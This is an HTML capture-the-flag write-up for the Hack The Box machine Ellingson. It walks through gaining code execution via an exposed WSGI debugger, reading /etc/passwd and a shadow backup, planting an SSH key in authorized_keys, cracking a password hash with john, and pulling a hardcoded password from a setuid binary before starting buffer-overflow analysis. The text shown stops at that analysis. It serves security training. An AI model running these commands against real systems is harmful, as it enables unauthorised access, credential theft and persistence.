I"Á˛<h1 id="htb-ellingson-101010139"><span style="color:red">HTB Ellingson (10.10.10.139)</span></h1>

<hr />

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<ul>
  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
    <ul>
      <li><a href="#tcp-port-80">TCP PORT 80</a></li>
    </ul>
  </li>
  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
  <li><a href="#part-4--generate-user-shell-hal">PART 4 : GENERATE USER SHELL (hal)</a></li>
  <li><a href="#part-5--lateral-movement-hal---margo">PART 5 : LATERAL MOVEMENT (hal -&gt; margo)</a></li>
  <li><a href="#part-6--privilege-escalation-margo---root">PART 6 : PRIVILEGE ESCALATION (margo -&gt; root)</a>
    <ul>
      <li><a href="#ltrace">ltrace</a></li>
      <li><a href="#program-flow">Program Flow</a></li>
      <li><a href="#the-auth-function">The <strong>auth()</strong> function:</a></li>
      <li><a href="#exploitpy-finding-the-right-offset">exploit.py (Finding the right offset)</a></li>
      <li><a href="#exploitpy-leaking-the-address-of-a-libc-function">exploit.py (Leaking the address of a libc function)</a></li>
      <li><a href="#exploitpy-write-binsh-to-a-data-segment">exploit.py (Write ‚Äú/bin/sh‚Äù to a data segment)</a></li>
      <li><a href="#exploitpy-calculate-the-libc-offsets">exploit.py (Calculate the libc offsets)</a></li>
      <li><a href="#exploitpy-putting-everything-together">exploit.py (Putting everything together)</a></li>
      <li><a href="#exploitpy-running-the-exploit">exploit.py (Running the exploit)</a></li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 15000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.139
<span class="go">
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 10.10.10.139
<span class="go">
  PORT   STATE SERVICE VERSION
</span><span class="gp">  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">  | ssh-hostkey: 
  |   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
  |   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
  |_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  | http-title: Ellingson Mineral Corp
  |_Requested resource was http://10.10.10.139/index
</span><span class="gp">  Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
</span></code></pre></div></div>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80">TCP PORT 80</h3>

<p><img src="./screenshots/32_ellingson/80_landing_page.png" alt="Landing Page" /></p>

<p>The landing page leads to a website for <span style="color:red">Ellingson Mineral Corp</span> which includes three articles and the faces behind the Company (Hal, Margo, Eugene, and Duke). This is clearly a reference to the 1995 film, <a href="https://en.wikipedia.org/wiki/Hackers_(film)">Hackers</a>.</p>

<p><img src="./screenshots/32_ellingson/80_article_3.png" alt="Suspicious Network activity" /></p>

<p>One of the articles posted is entitled ‚ÄúSuspicious Network activity‚Äù where it writes:</p>

<blockquote>
  <p>We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are. Love, Secret, Sex and God -The Plague</p>
</blockquote>

<p>The articles are accessed throught the <strong><code class="highlighter-rouge">/articles</code></strong> directory then followed by an <strong>id</strong> or <strong>index</strong> (e.g. <strong><code class="highlighter-rouge">/articles/3</code></strong>).</p>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<p><img src="./screenshots/32_ellingson/80_wsgi_error.png" alt="builtins.IndexError" /></p>

<p>Attempting to load a non-existent article using an <strong><em>index</em></strong> that is too large or too small redirects the user to a <span style="color:orange">WSGI error page</span>. WSGI (Web Server Gateway Interface) serves as a middleware that handles requests between the web server and the web application.</p>

<p><img src="./screenshots/32_ellingson/80_wsgi_rce.png" alt="RCE" /></p>

<p>The error page can also serve as an interactive debugger which you can leverage for command execution. Maybe this could be used to gain a reverse shell or plant an <strong><em>RSA public key</em></strong> to gain persistent access over <strong><em>ssh</em></strong>.</p>

<hr />

<h2 id="part-4--generate-user-shell-hal">PART 4 : GENERATE USER SHELL (hal)</h2>

<p>Using the command execution over the WSGI debugger:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"cat /etc/passwd | egrep -e *sh$"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"subprocess"</span><span class="p">)</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)</span>

  <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">theplague</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">Eugene</span> <span class="n">Belford</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">theplague</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">hal</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">hal</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">margo</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1002</span><span class="p">:</span><span class="mi">1002</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">margo</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
  <span class="n">duke</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1003</span><span class="p">:</span><span class="mi">1003</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">duke</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"ls -lah /home/hal"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"subprocess"</span><span class="p">)</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)</span>

  <span class="n">total</span> <span class="mi">36</span><span class="n">K</span>
  <span class="n">drwxrwx</span><span class="o">---</span> <span class="mi">5</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">May</span>  <span class="mi">7</span> <span class="mi">13</span><span class="p">:</span><span class="mi">12</span> <span class="o">.</span>
  <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span> <span class="n">root</span> <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">..</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">220</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">bash_logout</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">3.7</span><span class="n">K</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">bashrc</span>
  <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">cache</span>
  <span class="n">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span> <span class="mi">10</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">gnupg</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">807</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">profile</span>
  <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">hal</span>  <span class="n">hal</span>  <span class="mf">4.0</span><span class="n">K</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">ssh</span>
  <span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">hal</span>  <span class="n">hal</span>   <span class="mi">865</span> <span class="n">Mar</span>  <span class="mi">9</span>  <span class="mi">2019</span> <span class="o">.</span><span class="n">viminfo</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"echo -e '</span><span class="se">\n</span><span class="s">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf5LWxsMSacl9zZMA02V7umX21MZ/eIhYCS+iwa9coGiOEWsHO8h2iuDTrOPlg4HSlYx7pgkBe0oPHyorSLYXWHiXQyYqgcS60f1KTmd18hdo15YVReSgk4ZUM7t4j8rj/QqLiypb0cRJMGClWotbNr8UzaYvytl1X0t6z0LVAvC0VHNVqBi/FPjYVrn184ddP0uh1BKDPp2kPvE4Xlnm6D7jUXr72q/kEhB5EbnNNRBi6Dy1gMPQQQTUh1pI4M3yIbAyWvNS6SvLhIOqh76v7cQPI+aX557I+epxxT2B+RsQYW4TjA4fvvAQyktlL39dXzdDn2AXiVyVHDEL68uoMxwbRaz2aGhq0R0l7KZoHqd4sDda8U8vSPTEyofjPDXRUQWYBDsfpn1JHm+bvjXhCli2Mjgwc+Ep0jwSB8oJCiP5l7fi90VmbqKKYKQxLE1oEGBCHfZnNvl6oMnp8nzwUJDtO22yutNggIHeHh8SkVcrdlApospeKIRFTlAOrvyE= root@kali' &gt;&gt; /home/hal/.ssh/authorized_keys"</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"subprocess"</span><span class="p">)</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)</span>
</code></pre></div></div>

<p>Now that a public key has been added to <strong><em>.ssh/authorized_keys</em></strong>, attempt to login via ssh using an identity file:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> id_rsa <span class="nt">-l</span> hal 10.10.10.139
<span class="go">
</span><span class="gp">hal@ellingson:~$</span><span class="w">  </span><span class="nb">id</span>
<span class="go">
  uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)

</span></code></pre></div></div>

<p>The user, <strong><code class="highlighter-rouge">hal</code></strong>, is also part of the <strong><code class="highlighter-rouge">4(adm)</code></strong> group.</p>

<hr />

<h2 id="part-5--lateral-movement-hal---margo">PART 5 : LATERAL MOVEMENT (hal -&gt; margo)</h2>

<p>While inside <strong><code class="highlighter-rouge">hal</code></strong>‚Äôs shell:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hal@ellingson:~$</span><span class="w">  </span>find /var <span class="nt">-gid</span> 4 2&gt;/dev/null
<span class="go">
  /var/backups/shadow.bak
  ...omitted...

</span><span class="gp">hal@ellingson:~$</span><span class="w">  </span><span class="nb">cat</span> /var/backups/shadow.bak
<span class="go">
  root:*:17737:0:99999:7:::
  ...omitted...
</span><span class="gp">  theplague:$</span>6<span class="nv">$.</span>5ef7Dajxto8Lz3u<span class="nv">$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj</span>/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
<span class="gp">  hal:$</span>6<span class="nv">$UYTy</span>.cHj<span class="nv">$qGyl</span>.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
<span class="gp">  margo:$</span>6<span class="nv">$Lv8rcvK8$la</span>/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
<span class="gp">  duke:$</span>6<span class="nv">$bFjry0BT$OtPFpMfL</span>/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
<span class="go">
</span></code></pre></div></div>

<p>The <strong><code class="highlighter-rouge">adm</code></strong> group has read permissions for the <strong><code class="highlighter-rouge">shadow.bak</code></strong> file stored in <strong><code class="highlighter-rouge">/var/backups</code></strong>. It contains password hashes for all the members of the <strong><em>Ellingson</em></strong> team.</p>

<p>In the movie referenced by the box, Margo Wallace failed to change her password according to a schedule and her password coincidentally was ‚ÄúGOD‚Äù which according to Plague was one of the most commonly used passwords (along with Love, Sex, and Secret) which resulted in their system to be compromised.</p>

<p>Cracking Margo‚Äôs password hash is probably the next step forward:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="se">\$</span>6<span class="se">\$</span>Lv8rcvK8<span class="se">\$</span>la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1 <span class="o">&gt;</span> margo_hash
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /usr/share/wordlists/rockyou.txt | egrep <span class="nt">-ie</span> <span class="s2">"^.*g[o0]d.*$"</span> <span class="o">&gt;</span> wordlist_god
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>wordlist_god margo_hash
<span class="go">
</span><span class="gp">  iamgod$</span>08        <span class="o">(</span>?<span class="o">)</span>
<span class="go">
</span></code></pre></div></div>

<p>Since <strong><em>SHA512 crypt</em></strong> hashes takes a while to crack, limiting the size of the wordlist is recommended. Also, since there is a context on what Margo‚Äôs password might be, I created a subset of <strong>rockyou.txt</strong> to only include passwords that contains variations of the string <strong>god</strong>. The cracked password serves as both UNIX and SSH credentials for the user, <strong><code class="highlighter-rouge">margo</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hal@ellingson:~$</span><span class="w">  </span>su margo
<span class="gp">Password: iamgod$</span>08
<span class="go">
</span><span class="gp">margo@ellingson:/home/hal$</span><span class="w">  </span><span class="nb">id</span>
<span class="go">
  uid=1002(margo) gid=1002(margo) groups=1002(margo)

</span><span class="gp">margo@ellingson:/home/hal$</span><span class="w">  </span><span class="nb">cd</span> ~
<span class="go">
</span><span class="gp">margo@ellingson:~$</span><span class="w">  </span><span class="nb">ls</span> <span class="nt">-lah</span>
<span class="go">
  total 52K
  drwxrwx--- 6 margo margo 4.0K Mar 10  2019 .
  drwxr-xr-x 6 root  root  4.0K Mar  9  2019 ..
  -rw-r--r-- 1 margo margo  220 Mar  9  2019 .bash_logout
  -rw-r--r-- 1 margo margo 3.7K Mar  9  2019 .bashrc
  drwx------ 2 margo margo 4.0K Mar 10  2019 .cache
  drwx------ 3 margo margo 4.0K Mar 10  2019 .gnupg
  drwxrwxr-x 3 margo margo 4.0K Mar 10  2019 .local
  -rw-r--r-- 1 margo margo  807 Mar  9  2019 .profile
  drwx------ 2 margo margo 4.0K Mar  9  2019 .ssh
  -r-------- 1 margo margo   33 Mar 10  2019 user.txt
  -rw------- 1 margo margo 9.4K Mar 10  2019 .viminfo

</span><span class="gp">margo@ellingson:~$</span><span class="w">  </span><span class="nb">cat </span>user.txt
<span class="go">
  d0ff........................5903

</span></code></pre></div></div>

<hr />

<h2 id="part-6--privilege-escalation-margo---root">PART 6 : PRIVILEGE ESCALATION (margo -&gt; root)</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>find /bin /usr/bin <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">
  ...omitted...
  /usr/bin/garbage
  ...omitted...

</span></code></pre></div></div>

<p>Attempting to run the binary as another user (aside from margo) would return the following message:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">hal@ellingson:~$</span><span class="w">  </span>/usr/bin/garbage
<span class="go">
  User is not authorized to access this application. This attempt has been logged.

</span></code></pre></div></div>

<p>Otherwise:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>/usr/bin/garbage
<span class="go">
</span><span class="gp">  Enter access password: iamgodod$</span>08
<span class="go">
  access denied.

</span></code></pre></div></div>

<h3 id="ltrace">ltrace</h3>

<p>Check the program flow (i.e. syscalls, function arguments, signals) using <strong><code class="highlighter-rouge">ltrace</code></strong>. The password comparison might just be done using <strong><code class="highlighter-rouge">strcmp()</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>ltrace /usr/bin/garbage
<span class="go">
  getuid()                                                        = 1002
</span><span class="gp">  syslog(6, "user: %lu cleared to access this"..., 1002)          = &lt;void&gt;</span><span class="w">
</span><span class="go">  getpwuid(1002, 0x7a0030, 0x7a0010, 1)                           = 0x7f1052bf2f20
  strcpy(0x7ffe34be6a44, "margo")                                 = 0x7ffe34be6a44
  printf("Enter access password: ")                               = 23
  gets(0x7ffe34be69e0, 0x7a1b90, 0, 0Enter access password: 
  )                            = 0x7ffe34be69e0
  putchar(10, 0x7a1fa0, 0x7f1052bf28d0, 0x7f1052915081
  )           = 10
  strcmp("", "N3veRF3@r1iSh3r3!")                                 = -78
  puts("access denied."access denied.
  )                                          = 15
</span><span class="gp">  exit(-1 &lt;no return ...&gt;</span><span class="w">
</span><span class="go">  +++ exited (status 255) +++

</span></code></pre></div></div>

<p>Aaaaaand the password checking is indeed done by using <strong><code class="highlighter-rouge">strcmp("", "N3veRF3@r1iSh3r3!")</code></strong>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">margo@ellingson:~$</span><span class="w">  </span>/usr/bin/garbage
<span class="go">
  Enter access password: N3veRF3@r1iSh3r3!

  access granted.
  [+] W0rM || Control Application
  [+] ---------------------------
  Select Option
  1: Check Balance
  2: Launch
  3: Cancel
  4: Exit
</span><span class="gp">  &gt;</span><span class="w"> </span>1
<span class="gp">  Balance is $</span>1337
<span class="gp">  &gt;</span><span class="w"> </span>2
<span class="go">  Row Row Row Your Boat...
</span><span class="gp">  &gt;</span><span class="w"> </span>3
<span class="go">  The tankers have stopped capsizing
</span><span class="gp">  &gt;</span><span class="w"> </span>4
<span class="go">
</span></code></pre></div></div>

<p>Trying to access the <strong><code class="highlighter-rouge">garbage</code></strong> binary again with the right password leads to a control panel and all options just outputs a string and are not interactive. If this were a buffer overflow vulnerability, then the only attack vectors left are the <strong style="color:red">password input</strong> and the <strong style="color:red">option selection input</strong>.</p>

<p>Now, it‚Äôs time to save the binary locally and attempt to create an exploit:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>scp margo@10.10.10.139:/usr/bin/garbage ./garbage
<span class="gp">$</span><span class="w"> </span>margo@10.10.10.139<span class="s1">'s password: iamgod$08
</span><span class="go">
  garbage                                                                100%

</span><span class="gp">$</span><span class="w"> </span>file ./garbage
<span class="go">
  ./garbage: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped

</span><span class="gp">$</span><span class="w"> </span>gdb <span class="nt">--nh</span> <span class="nt">-q</span> ./garbage
<span class="go">
(gdb) checksec

  Canary                        : No
  NX                            : Yes
  PIE                           : No
  Fortify                       : No
  RelRO                         : Partial

(gdb) disassemble main

</span><span class="gp">  0x0000000000401619 &lt;+0&gt;</span>:	push   rbp
<span class="gp">  0x000000000040161a &lt;+1&gt;</span>:	mov    rbp,rsp
<span class="gp">  0x000000000040161d &lt;+4&gt;</span>:	sub    rsp,0x10
<span class="gp">  0x0000000000401621 &lt;+8&gt;</span>:	mov    eax,0x0
<span class="gp">  0x0000000000401626 &lt;+13&gt;</span>:	call   0x401459 &lt;check_user&gt;
<span class="gp">  0x000000000040162b &lt;+18&gt;</span>:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],eax
<span class="gp">  0x000000000040162e &lt;+21&gt;</span>:	mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
<span class="gp">  0x0000000000401631 &lt;+24&gt;</span>:	mov    edi,eax
<span class="gp">  0x0000000000401633 &lt;+26&gt;</span>:	call   0x4014d4 &lt;set_username&gt;
<span class="gp">  0x0000000000401638 &lt;+31&gt;</span>:	mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
<span class="gp">  0x000000000040163b &lt;+34&gt;</span>:	mov    edi,eax
<span class="gp">  0x000000000040163d &lt;+36&gt;</span>:	call   0x401513 &lt;auth&gt;   
<span class="go">  ...omitted...
</span><span class="gp">  0x00000000004016e7 &lt;+206&gt;</span>:	mov    eax,0x0
<span class="gp">  0x00000000004016ec &lt;+211&gt;</span>:	call   0x40133c &lt;checkbalance&gt;
<span class="gp">  0x00000000004016f1 &lt;+216&gt;</span>:	jmp    0x40172b &lt;main+274&gt;
<span class="gp">  0x00000000004016f3 &lt;+218&gt;</span>:	mov    eax,0x0
<span class="gp">  0x00000000004016f8 &lt;+223&gt;</span>:	call   0x401316 &lt;launch&gt;
<span class="gp">  0x00000000004016fd &lt;+228&gt;</span>:	jmp    0x40172b &lt;main+274&gt;
<span class="gp">  0x00000000004016ff &lt;+230&gt;</span>:	mov    eax,0x0
<span class="gp">  0x0000000000401704 &lt;+235&gt;</span>:	call   0x401329 &lt;cancel&gt;
<span class="gp">  0x0000000000401709 &lt;+240&gt;</span>:	jmp    0x40172b &lt;main+274&gt;
<span class="gp">  0x000000000040170b &lt;+242&gt;</span>:	mov    edi,0x0
<span class="gp">  0x0000000000401710 &lt;+247&gt;</span>:	call   0x401160 &lt;<span class="nb">exit</span>@plt&gt;
<span class="gp">  0x0000000000401715 &lt;+252&gt;</span>:	lea    rdi,[rip+0xaf8]        <span class="c"># 0x402214</span>
<span class="gp">  0x000000000040171c &lt;+259&gt;</span>:	call   0x401050 &lt;puts@plt&gt;
<span class="gp">  0x0000000000401721 &lt;+264&gt;</span>:	mov    edi,0xffffffff
<span class="gp">  0x0000000000401726 &lt;+269&gt;</span>:	call   0x401160 &lt;<span class="nb">exit</span>@plt&gt;
<span class="gp">  0x000000000040172b &lt;+274&gt;</span>:	jmp    0x40169e &lt;main+133&gt;
<span class="gp">  0x0000000000401730 &lt;+279&gt;</span>:	mov    edi,0xffffffff
<span class="gp">  0x0000000000401735 &lt;+284&gt;</span>:	call   0x401160 &lt;<span class="nb">exit</span>@plt&gt;
<span class="go">
</span></code></pre></div></div>

<p><strong><code class="highlighter-rouge">/usr/bin/garbage</code></strong> is a <span style="color:orange">64-bit</span> ELF executable with <span style="color:orange">ASLR (Address Space Layout Randomization)</span> enabled which means that certain modules or libraries (especially the <strong>libc.so</strong> file) are offset randomly every instance generated. Its security features include only NX (non-executable segment) protection and Partial RelRO (Relocation Read-Only).</p>

<p><span style="color:orange">NX (Non-execute)</span></p>
<blockquote>
  <p>The application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa.</p>
</blockquote>

<p><span style="color:orange">Partial RelRO (Relocation Read-Only)</span></p>
<blockquote>
  <p>The headers in your binary, which need to be writable during startup of the application (to allow the dynamic linker to load and link stuff like shared libraries) are marked as read-only when the linker is done doing its magic (but before the application itself is launched)</p>
</blockquote>

<h3 id="program-flow">Program Flow</h3>

<table>
<tr>
  <td>#1</td>
  <td>Checks User ID [ check_user() ]</td>
  <td><span style="color:green">if uid==1002 or uid==0: <span style="text-decoration:underline">GO TO #2</span></span><br /><span style="color:red">if uid==1000: exit()</span></td>
</tr>
<tr>
  <td>#2</td>
  <td>Authentication [ auth() ]</td>
  <td><span style="color:green">if password=="N3veRF3@r1iSh3r3!": <span style="text-decoration:underline">GO TO #3</span></span><br /><span style="color:red">else: exit()</span></td>
</tr>
<tr>
  <td>#3</td>
  <td>Select Option</td>
  <td><span style="color:green">if option==1: checkbalance(); <span style="text-decoration:underline">GO TO #3</span><br />if option==2: launch(); <span style="text-decoration:underline">GO TO #3</span><br />if option==3: cancel(); <span style="text-decoration:underline">GO TO #3</span></span><br /><span style="color:red">else: exit()</span></td>
</tr>
</table>

<h3 id="the-auth-function">The <strong>auth()</strong> function:</h3>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disassemble auth

  ...omitted...
  0x0000000000401558 &lt;+69&gt;:	lea    rax,[rbp-0x80]
  0x000000000040155c &lt;+73&gt;:	mov    rdi,rax
  0x000000000040155f &lt;+76&gt;:	mov    eax,0x0
  0x0000000000401564 &lt;+81&gt;:	call   0x401100 &lt;gets@plt&gt;
  0x0000000000401569 &lt;+86&gt;:	mov    edi,0xa
  0x000000000040156e &lt;+91&gt;:	call   0x401030 &lt;putchar@plt&gt;
  0x0000000000401573 &lt;+96&gt;:	lea    rax,[rbp-0x80]
  0x0000000000401577 &lt;+100&gt;:	lea    rsi,[rip+0xbe1]        <span class="c"># 0x40215f</span>
  0x000000000040157e &lt;+107&gt;:	mov    rdi,rax
  0x0000000000401581 &lt;+110&gt;:	call   0x4010e0 &lt;strcmp@plt&gt;
  0x0000000000401586 &lt;+115&gt;:	<span class="nb">test   </span>eax,eax
  0x0000000000401588 &lt;+117&gt;:	jne    0x401606 &lt;auth+243&gt;
  ...omitted...
  0x0000000000401606 &lt;+243&gt;:	lea    rdi,[rip+0xb74]        <span class="c"># 0x402181</span>
  0x000000000040160d &lt;+250&gt;:	call   0x401050 &lt;puts@plt&gt;
  0x0000000000401612 &lt;+255&gt;:	mov    eax,0x0
  0x0000000000401617 &lt;+260&gt;:	leave  
  0x0000000000401618 &lt;+261&gt;:	ret

</code></pre></div></div>

